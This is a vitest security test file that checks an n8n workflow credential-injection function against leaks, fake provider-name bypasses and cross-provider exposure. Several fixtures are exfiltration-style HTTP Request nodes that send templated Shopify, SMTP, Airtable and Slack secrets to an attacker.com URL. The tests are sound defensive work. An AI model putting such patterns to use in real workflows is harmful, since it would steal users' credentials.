/**
 * Runtime security tests — credential injection fix audit
 *
 * Tests call injectCredentialsIntoWorkflow() directly (the real production function,
 * no mocking). Each test asserts actual output values, not source-code patterns.
 *
 * Test groups:
 *   A — HTTP Request and generic nodes must receive NO credentials
 *   B — Fake provider node bypass: nodes with crafted names containing provider substrings
 *   C — Cross-provider isolation: a legitimate Shopify node must not leak Slack credentials
 *   D — Legitimate provider nodes still receive correct credentials
 *   E — Edge cases (empty type, null type, no credentials, etc.)
 */

import { describe, it, expect } from 'vitest';
import { injectCredentialsIntoWorkflow, type IntegrationRecord } from '../lib/integrations';

// ── Shared test fixtures ──────────────────────────────────────────────────────

const ALL_INTEGRATIONS: IntegrationRecord[] = [
  {
    provider: 'shopify',
    credentials: {
      admin_access_token: 'SHOPIFY_TOKEN_SECRET',
      api_key:            'SHOPIFY_API_KEY_SECRET',
      shop_domain:        'victim.myshopify.com',
    },
  },
  {
    provider: 'slack',
    credentials: {
      webhook_url: 'https://hooks.slack.com/services/REAL/SLACK/SECRET',
    },
  },
  {
    provider: 'gmail',
    credentials: {
      smtp_host: 'smtp.gmail.com',
      smtp_port: '587',
      smtp_user: 'victim@gmail.com',
      smtp_pass: 'REAL_SMTP_PASSWORD',
      from_email: 'victim@gmail.com',
    },
  },
  {
    provider: 'airtable',
    credentials: {
      airtable_token: 'AIRTABLE_TOKEN_SECRET',
      base_id:        'appREAL_BASE_ID',
      table_name:     'Orders',
    },
  },
];

// All known real credential values — used to assert nothing leaked
const REAL_VALUES = [
  'SHOPIFY_TOKEN_SECRET',
  'SHOPIFY_API_KEY_SECRET',
  'victim.myshopify.com',
  'hooks.slack.com/services/REAL/SLACK/SECRET',
  'REAL_SMTP_PASSWORD',
  'victim@gmail.com',
  'AIRTABLE_TOKEN_SECRET',
  'appREAL_BASE_ID',
];

function noCredsInNode(node: Record<string, unknown>): void {
  const serialized = JSON.stringify(node);
  for (const secret of REAL_VALUES) {
    expect(serialized, `secret "${secret}" must not appear in node`).not.toContain(secret);
  }
}

function injectNode(node: Record<string, unknown>): Record<string, unknown> {
  const result = injectCredentialsIntoWorkflow(
    { name: 'test', nodes: [node], connections: {} },
    ALL_INTEGRATIONS
  );
  return ((result.nodes as Array<Record<string, unknown>>)[0]);
}

// ─── Group A: HTTP Request and generic nodes ──────────────────────────────────

describe('A — Generic/HTTP nodes: no credential injection', () => {

  it('A1: HTTP Request node — $env placeholders remain as literal text', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.httpRequest',
      name: 'Exfil',
      parameters: {
        url: 'https://attacker.com/?s={{ $env.SHOPIFY_ACCESS_TOKEN }}&p={{ $env.SMTP_PASS }}&a={{ $env.AIRTABLE_API_KEY }}&sl={{ $env.SLACK_WEBHOOK_URL }}',
      },
    });

    const url = (node.parameters as Record<string, string>).url;
    // All placeholders still literal
    expect(url).toContain('{{ $env.SHOPIFY_ACCESS_TOKEN }}');
    expect(url).toContain('{{ $env.SMTP_PASS }}');
    expect(url).toContain('{{ $env.AIRTABLE_API_KEY }}');
    expect(url).toContain('{{ $env.SLACK_WEBHOOK_URL }}');
    // No real secrets
    noCredsInNode(node);
  });

  it('A2: HTTP Request node — user.* placeholders remain as literal text', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.httpRequest',
      name: 'Exfil2',
      parameters: {
        jsonBody: JSON.stringify({
          t:  '{{ user.shopify.token }}',
          s:  '{{ user.shopify.store_url }}',
          sl: '{{ user.slack.webhook_url }}',
          sp: '{{ user.email.smtp_pass }}',
          at: '{{ user.airtable.api_key }}',
        }),
      },
    });

    const body = JSON.parse((node.parameters as Record<string, string>).jsonBody);
    expect(body.t).toBe('{{ user.shopify.token }}');
    expect(body.s).toBe('{{ user.shopify.store_url }}');
    expect(body.sl).toBe('{{ user.slack.webhook_url }}');
    expect(body.sp).toBe('{{ user.email.smtp_pass }}');
    expect(body.at).toBe('{{ user.airtable.api_key }}');
    noCredsInNode(node);
  });

  it('A3: HTTP Request node — node object is returned byte-for-byte unchanged', () => {
    const original = {
      type: 'n8n-nodes-base.httpRequest',
      name: 'Ping',
      parameters: {
        method: 'POST',
        url: 'https://attacker.com/{{ $env.SHOPIFY_ACCESS_TOKEN }}',
        headers: { Authorization: 'Bearer {{ user.shopify.token }}' },
      },
    };
    const node = injectNode(original);
    // The returned node must equal the input exactly
    expect(JSON.stringify(node)).toBe(JSON.stringify(original));
  });

  it('A4: Code node — no injection', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.code',
      parameters: { jsCode: 'return "{{ $env.SHOPIFY_ACCESS_TOKEN }}"' },
    });
    const code = (node.parameters as Record<string, string>).jsCode;
    expect(code).toBe('return "{{ $env.SHOPIFY_ACCESS_TOKEN }}"');
    noCredsInNode(node);
  });

  it('A5: Set node — no injection', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.set',
      parameters: { values: [{ name: 'token', value: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' }] },
    });
    noCredsInNode(node);
  });

  it('A6: If/Switch node — no injection', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.if',
      parameters: { conditions: [{ value1: '{{ $env.SMTP_PASS }}', value2: 'test' }] },
    });
    noCredsInNode(node);
  });

  it('A7: Merge node — no injection', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.merge',
      parameters: { token: '{{ user.shopify.token }}' },
    });
    noCredsInNode(node);
  });

  it('A8: Webhook node — no injection', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.webhook',
      parameters: { path: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    noCredsInNode(node);
  });

  it('A9: Completely custom unknown node type — no injection', () => {
    const node = injectNode({
      type: 'my-company.customLLMProcessor',
      parameters: { apiKey: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    noCredsInNode(node);
  });

});

// ─── Group B: Former bypass — now closed by exact allowlist ──────────────────
//
// The substring-matching bypass (F-01 from the prior audit) allowed crafted node
// types like 'shopifyFakeHttp' to receive real credentials. The exact-allowlist
// patch closes this: only node types in PROVIDER_NODE_ALLOWLIST receive injection.
//
// These tests confirm the bypass is CLOSED — fake provider nodes now return
// unchanged with placeholders left as literal text.

describe('B — Former bypass: now closed by exact allowlist', () => {

  it('B1: shopifyFakeHttp — bypass CLOSED, placeholders remain literal', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.shopifyFakeHttp',
      parameters: {
        url: 'https://attacker.com/collect?token={{ $env.SHOPIFY_ACCESS_TOKEN }}',
      },
    });
    const url = (node.parameters as Record<string, string>).url;
    // Placeholder must remain literal — no token injected
    expect(url).toContain('{{ $env.SHOPIFY_ACCESS_TOKEN }}');
    expect(url).not.toContain('SHOPIFY_TOKEN_SECRET');
    // Node returned unchanged (not even deepInject was called)
    expect(JSON.stringify(node)).toBe(
      JSON.stringify({
        type: 'n8n-nodes-base.shopifyFakeHttp',
        parameters: { url: 'https://attacker.com/collect?token={{ $env.SHOPIFY_ACCESS_TOKEN }}' },
      })
    );
  });

  it('B2: slackFakeWebhook — bypass CLOSED, no conversion to httpRequest', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.slackFakeWebhook',
      parameters: { url: '{{ $env.SLACK_WEBHOOK_URL }}', text: 'hello' },
    });
    // Must NOT be converted to an httpRequest (conversion only fires for allowlisted types)
    expect(node.type).toBe('n8n-nodes-base.slackFakeWebhook');
    expect((node.parameters as Record<string, string>).url).toBe('{{ $env.SLACK_WEBHOOK_URL }}');
    expect(JSON.stringify(node)).not.toContain('hooks.slack.com');
  });

  it('B3: emailFakeHttp — bypass CLOSED, SMTP credentials not injected', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.emailFakeHttp',
      parameters: { pass: '{{ $env.SMTP_PASS }}', user: '{{ $env.SMTP_USER }}' },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.pass).toBe('{{ $env.SMTP_PASS }}');
    expect(params.user).toBe('{{ $env.SMTP_USER }}');
    expect(JSON.stringify(node)).not.toContain('SHOPIFY_TOKEN_SECRET');
  });

  it('B4: airtableFakeHttp — bypass CLOSED, Airtable credentials not injected', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.airtableFakeHttp',
      parameters: { key: '{{ $env.AIRTABLE_API_KEY }}', base: '{{ $env.AIRTABLE_BASE_ID }}' },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.key).toBe('{{ $env.AIRTABLE_API_KEY }}');
    expect(params.base).toBe('{{ $env.AIRTABLE_BASE_ID }}');
  });

  it('B5: shopifySlackIntegration — bypass CLOSED, node returned unchanged', () => {
    // Combined fake type previously caused both Shopify injection AND Slack conversion.
    // With exact allowlist: type is not in any allowed set → node returned as-is.
    const node = injectNode({
      type: 'n8n-nodes-base.shopifySlackIntegration',
      parameters: {
        shopifyToken: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
        slackWebhook: '{{ $env.SLACK_WEBHOOK_URL }}',
      },
    });
    // Must NOT be converted to httpRequest
    expect(node.type).toBe('n8n-nodes-base.shopifySlackIntegration');
    // Must NOT receive any real credentials
    expect(JSON.stringify(node)).not.toContain('SHOPIFY_TOKEN_SECRET');
    expect(JSON.stringify(node)).not.toContain('hooks.slack.com');
  });

});

// ─── Group C: Cross-provider isolation in legitimate nodes ────────────────────
//
// Legitimate Shopify node must not receive Slack secrets, and vice versa.

describe('C — Cross-provider isolation', () => {

  it('C1: Shopify node — Slack webhook placeholder becomes empty string', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.shopify',
      parameters: { slackHook: '{{ $env.SLACK_WEBHOOK_URL }}' },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.slackHook).toBe('');
    expect(params.slackHook).not.toContain('hooks.slack.com');
  });

  it('C2: Shopify node — SMTP password placeholder becomes empty string', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.shopify',
      parameters: { emailPass: '{{ $env.SMTP_PASS }}' },
    });
    expect((node.parameters as Record<string, string>).emailPass).toBe('');
  });

  it('C3: Shopify node — Airtable key placeholder becomes empty string', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.shopify',
      parameters: { atKey: '{{ $env.AIRTABLE_API_KEY }}' },
    });
    expect((node.parameters as Record<string, string>).atKey).toBe('');
  });

  it('C4: Slack node — Shopify token placeholder becomes empty string', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.slack',
      parameters: { text: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    // If slack conversion fired, text comes from node.parameters.text before conversion
    // After conversion the text field is serialized into jsonBody
    const serialized = JSON.stringify(node);
    expect(serialized).not.toContain('SHOPIFY_TOKEN_SECRET');
  });

  it('C5: Gmail/SMTP node — Shopify token placeholder becomes empty string', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.gmail',
      parameters: { subject: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    expect((node.parameters as Record<string, string>).subject).toBe('');
    expect(JSON.stringify(node)).not.toContain('SHOPIFY_TOKEN_SECRET');
  });

  it('C6: Gmail/SMTP node — Slack webhook placeholder becomes empty string', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.gmail',
      parameters: { url: '{{ $env.SLACK_WEBHOOK_URL }}' },
    });
    expect((node.parameters as Record<string, string>).url).toBe('');
    expect(JSON.stringify(node)).not.toContain('hooks.slack.com');
  });

  it('C7: Airtable node — Shopify and Slack placeholders both become empty string', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.airtable',
      parameters: {
        shopify: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
        slack:   '{{ $env.SLACK_WEBHOOK_URL }}',
        smtp:    '{{ $env.SMTP_PASS }}',
      },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.shopify).toBe('');
    expect(params.slack).toBe('');
    expect(params.smtp).toBe('');
  });

});

// ─── Group D: Legitimate provider nodes work correctly ────────────────────────

describe('D — Legitimate nodes: correct credential injection', () => {

  it('D1: Shopify node — $env.SHOPIFY_ACCESS_TOKEN substituted', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.shopify',
      parameters: { accessToken: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    expect((node.parameters as Record<string, string>).accessToken).toBe('SHOPIFY_TOKEN_SECRET');
  });

  it('D2: Shopify node — params.accessToken and params.storeUrl set by type-specific injection', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.shopify',
      parameters: { resource: 'order' },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.accessToken).toBe('SHOPIFY_TOKEN_SECRET');
    expect(params.storeUrl).toBe('victim.myshopify.com');
  });

  it('D3: Shopify node — user.shopify.token placeholder substituted', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.shopify',
      parameters: { tok: '{{ user.shopify.token }}' },
    });
    expect((node.parameters as Record<string, string>).tok).toBe('SHOPIFY_TOKEN_SECRET');
  });

  it('D4: Slack node — converted to httpRequest with real webhook URL', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.slack',
      parameters: { text: 'Order confirmed' },
    });
    expect(node.type).toBe('n8n-nodes-base.httpRequest');
    const params = node.parameters as Record<string, string>;
    expect(params.url).toBe('https://hooks.slack.com/services/REAL/SLACK/SECRET');
    expect(params.method).toBe('POST');
  });

  it('D5: Slack node — text parameter preserved in jsonBody', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.slack',
      parameters: { text: 'Alert: order placed' },
    });
    const params = node.parameters as Record<string, string>;
    const body = JSON.parse(params.jsonBody);
    expect(body.text).toBe('Alert: order placed');
  });

  it('D6: Gmail/SMTP node — SMTP_PASS substituted', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.emailReadImap',
      parameters: { password: '{{ $env.SMTP_PASS }}', user: '{{ $env.SMTP_USER }}' },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.password).toBe('REAL_SMTP_PASSWORD');
    expect(params.user).toBe('victim@gmail.com');
  });

  it('D7: Gmail node — user.email.smtp_pass substituted', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.gmail',
      parameters: { pass: '{{ user.email.smtp_pass }}' },
    });
    expect((node.parameters as Record<string, string>).pass).toBe('REAL_SMTP_PASSWORD');
  });

  it('D8: Airtable node — $env.AIRTABLE_API_KEY substituted', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.airtable',
      parameters: { apiKey: '{{ $env.AIRTABLE_API_KEY }}' },
    });
    expect((node.parameters as Record<string, string>).apiKey).toBe('AIRTABLE_TOKEN_SECRET');
  });

  it('D9: Airtable node — params.apiKey, base, table set by type-specific injection', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.airtable',
      parameters: {},
    });
    const params = node.parameters as Record<string, string>;
    expect(params.apiKey).toBe('AIRTABLE_TOKEN_SECRET');
    expect(params.base).toBe('appREAL_BASE_ID');
    expect(params.table).toBe('Orders');
  });

  it('D10: SMTP node — host and port placeholders substituted', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.emailSend',
      parameters: {
        host: '{{ $env.SMTP_HOST }}',
        port: '{{ $env.SMTP_PORT }}',
      },
    });
    const params = node.parameters as Record<string, string>;
    expect(params.host).toBe('smtp.gmail.com');
    expect(params.port).toBe('587');
  });

});

// ─── Group E: Edge cases ──────────────────────────────────────────────────────

describe('E — Edge cases', () => {

  it('E1: node with empty string type → no injection', () => {
    const node = injectNode({
      type: '',
      parameters: { url: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    noCredsInNode(node);
    expect((node.parameters as Record<string, string>).url).toBe('{{ $env.SHOPIFY_ACCESS_TOKEN }}');
  });

  it('E2: node with undefined type → no injection', () => {
    const node = injectNode({
      parameters: { url: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
    });
    noCredsInNode(node);
  });

  it('E3: empty integrations list → all placeholders become empty strings in matched nodes', () => {
    const result = injectCredentialsIntoWorkflow(
      {
        name: 'test',
        nodes: [{
          type: 'n8n-nodes-base.shopify',
          parameters: { accessToken: '{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
        }],
        connections: {},
      },
      [] // no integrations connected
    );
    const node = (result.nodes as Array<Record<string, unknown>>)[0];
    // Placeholder consumed to empty string — no real token (none available)
    expect((node.parameters as Record<string, string>).accessToken).toBe('');
  });

  it('E4: workflow with no nodes → returns empty array', () => {
    const result = injectCredentialsIntoWorkflow(
      { name: 'test', nodes: [], connections: {} },
      ALL_INTEGRATIONS
    );
    expect(result.nodes).toEqual([]);
  });

  it('E5: null workflowJson → returns workflow with empty nodes array', () => {
    // null ?? {} → {}, then (workflow.nodes ?? []).map(...) → []
    const result = injectCredentialsIntoWorkflow(null, ALL_INTEGRATIONS);
    expect(result.nodes).toEqual([]);
  });

  it('E6: deeply nested placeholders in HTTP Request node — all literal', () => {
    // Ensure deep recursion inside an HTTP Request node does not inject
    const node = injectNode({
      type: 'n8n-nodes-base.httpRequest',
      parameters: {
        headers: {
          Authorization: 'Bearer {{ user.shopify.token }}',
          nested: {
            deep: '{{ $env.SMTP_PASS }}',
          },
        },
        body: {
          credentials: ['{{ $env.AIRTABLE_API_KEY }}', '{{ user.email.smtp_pass }}'],
        },
      },
    });
    noCredsInNode(node);
    const headers = (node.parameters as Record<string, unknown>).headers as Record<string, unknown>;
    expect((headers as Record<string, string>).Authorization).toBe('Bearer {{ user.shopify.token }}');
  });

  it('E7: multiple HTTP Request nodes in one workflow — all stay literal', () => {
    const result = injectCredentialsIntoWorkflow(
      {
        name: 'test',
        nodes: [
          {
            type: 'n8n-nodes-base.httpRequest',
            name: 'Node1',
            parameters: { url: 'https://a.com/{{ $env.SHOPIFY_ACCESS_TOKEN }}' },
          },
          {
            type: 'n8n-nodes-base.httpRequest',
            name: 'Node2',
            parameters: { url: 'https://b.com/{{ $env.SMTP_PASS }}' },
          },
          {
            type: 'n8n-nodes-base.shopify',
            name: 'LegitNode',
            parameters: { resource: 'order' },
          },
        ],
        connections: {},
      },
      ALL_INTEGRATIONS
    );
    const nodes = result.nodes as Array<Record<string, unknown>>;
    // HTTP Request nodes unchanged
    expect(JSON.stringify(nodes[0])).not.toContain('SHOPIFY_TOKEN_SECRET');
    expect(JSON.stringify(nodes[1])).not.toContain('REAL_SMTP_PASSWORD');
    // Shopify node correctly injected
    const shopifyParams = nodes[2].parameters as Record<string, string>;
    expect(shopifyParams.accessToken).toBe('SHOPIFY_TOKEN_SECRET');
  });

  it('E8: placeholder in node name field of HTTP Request node — stays literal', () => {
    const node = injectNode({
      type: 'n8n-nodes-base.httpRequest',
      name: '{{ $env.SHOPIFY_ACCESS_TOKEN }}',
      parameters: {},
    });
    expect(node.name).toBe('{{ $env.SHOPIFY_ACCESS_TOKEN }}');
    noCredsInNode(node);
  });

});
